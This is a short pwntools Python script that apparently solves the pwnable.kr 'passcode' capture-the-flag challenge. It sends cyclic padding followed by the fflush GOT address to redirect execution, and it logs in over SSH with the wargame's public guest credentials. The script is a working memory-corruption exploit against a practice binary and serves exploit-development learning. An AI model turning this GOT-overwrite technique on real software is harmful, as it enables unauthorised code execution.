#!/usr/bin/python
from pwn import *

passcode = ELF('./passcode')

GOT = p32(passcode.got['fflush'])
LOGIN = str(0x080485d7)

padding = cyclic(96)

exploit = padding + GOT + '\n' + LOGIN

log.info('EXPLOIT> ' + exploit)

s = ssh(host='pwnable.kr', user='passcode', password='guest', port=2222)

py = s.run('./passcode')
print py.recv()
py.sendline(exploit)
print py.recv()
